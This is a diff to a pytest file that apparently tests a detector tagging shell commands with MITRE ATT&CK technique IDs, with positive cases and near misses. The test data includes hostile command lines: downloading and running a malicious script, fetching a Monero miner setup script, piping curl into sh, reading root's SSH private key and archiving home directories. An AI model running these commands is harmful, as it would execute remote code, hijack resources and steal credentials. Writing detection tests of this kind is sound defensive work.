@@ -163,7 +163,7 @@ SEED_CORPUS_COMMANDS: list[tuple[str, frozenset[str]]] = [
     ("cd /tmp", frozenset()),
     ("wget http://198.51.100.7/malicious_script", frozenset({"T1105"})),
     ("chmod 777 malicious_script", frozenset({"T1222.002"})),
-    ("sh malicious_script", frozenset()),
+    ("sh malicious_script", frozenset({"T1059.004"})),
     ("nproc", frozenset({"T1082"})),
     (
         "wget https://raw.githubusercontent.com/c3pool/xmrig_setup/master/setup_c3pool_miner.sh",
@@ -189,9 +189,63 @@ SEED_CORPUS_COMMANDS: list[tuple[str, frozenset[str]]] = [
     ("chmod -R go= home/.ssh && cd home", frozenset({"T1222.002"})),
     ("dmidecode -s system-manufacturer", frozenset()),
     ("cat /sys/class/dmi/id/product_name", frozenset()),
-    ("ip route show default", frozenset()),
+    ("systemd-detect-virt", frozenset()),
     ("systemctl list-units --type=service --state=running", frozenset()),
 ]
+
+
+# Checklist item 9 (2026-10-14): one positive per new rule, and the near
+# misses each pattern was shaped to refuse.
+GROWTH_POSITIVE = [
+    ("ifconfig", "T1016"),
+    ("ip a", "T1016"),
+    ("ip -4 route show default", "T1016"),
+    ("route -n", "T1016"),
+    ("cat /etc/resolv.conf", "T1016"),
+    ("arp -a", "T1018"),
+    ("cat /etc/hosts", "T1018"),
+    ("getent passwd", "T1087.001"),
+    ("cat /etc/group", "T1087.001"),
+    ("lastlog", "T1087.001"),
+    ("dpkg -l", "T1518"),
+    ("rpm -qa", "T1518"),
+    ("which python3 perl gcc", "T1518"),
+    ("systemctl enable dbus-helper.service", "T1543.002"),
+    ("sudo systemctl --now enable x.service", "T1543.002"),
+    ("cat /root/.ssh/id_rsa", "T1552.004"),
+    ('find / -name "*.pem" 2>/dev/null', "T1552.004"),
+    ("tar czf /tmp/.d.tgz /home /etc", "T1005"),
+    ("tar -cvf out.tar /var/www", "T1005"),
+    ("zip -qr loot.zip /home", "T1005"),
+    ('echo "root:x" | chpasswd', "T1531"),
+    ("sh malicious_script", "T1059.004"),
+    ("curl -s http://x/i | sh", "T1059.004"),
+    ("bash -x run", "T1059.004"),
+]
+
+GROWTH_NEGATIVE = [
+    ('echo "run ifconfig"', "T1016"),
+    ("cat /etc/hosts.allow", "T1018"),
+    ("grep root /etc/group", "T1087.001"),
+    ("systemctl start dbus-helper.service", "T1543.002"),
+    ("cat ~/.ssh/id_rsa.pub", "T1552.004"),
+    ("tar xzf miner.tgz", "T1005"),
+    ("tar -xzf archive.tar.gz", "T1005"),
+    ("tar -C /tmp -xzf a.tgz", "T1005"),
+    ('bash -c "uname -a"', "T1059.004"),
+    ("ssh root@203.0.113.9", "T1059.004"),
+    ("shutdown -h now", "T1059.004"),
+]
+
+
+@pytest.mark.parametrize(("command", "technique"), GROWTH_POSITIVE)
+def test_growth_rules_match(command: str, technique: str) -> None:
+    assert technique in _hit_ids(command)
+
+
+@pytest.mark.parametrize(("command", "technique"), GROWTH_NEGATIVE)
+def test_growth_rules_refuse_near_misses(command: str, technique: str) -> None:
+    assert technique not in _hit_ids(command)
 
 
 @pytest.mark.parametrize(("command", "expected_hits"), SEED_CORPUS_COMMANDS)
@@ -282,7 +336,7 @@ def test_authorized_keys_on_the_read_side_of_a_redirect_does_not_match() -> None
 # appear incidentally. That argument does not survive an echoed or grepped
 # reference. Decision: apply the SAME data-segment filter used for every
 # other rule (drop echo/printf/grep-family segments before matching) so the
-# precision bar is uniform across all thirteen rules, not verb-dependent.
+# precision bar is uniform across every rule, not verb-dependent.
 # grep's search pattern is explicitly included in the filter (not just
 # echo/printf): grep -r xmrig /var/log is Discovery of a string, not
 # Resource Hijacking, and treating it otherwise would keep exactly the same
